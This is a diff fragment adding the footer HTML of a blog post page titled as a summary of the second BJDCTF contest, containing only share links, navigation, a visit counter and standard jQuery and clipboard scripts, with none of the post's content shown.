+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&text=第二届 BJDCTF 总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&is_video=false&description=第二届 BJDCTF 总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第二届 BJDCTF 总结&body=Check out this article: http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&title=第二届 BJDCTF 总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&name=第二届 BJDCTF 总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/&t=第二届 BJDCTF 总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
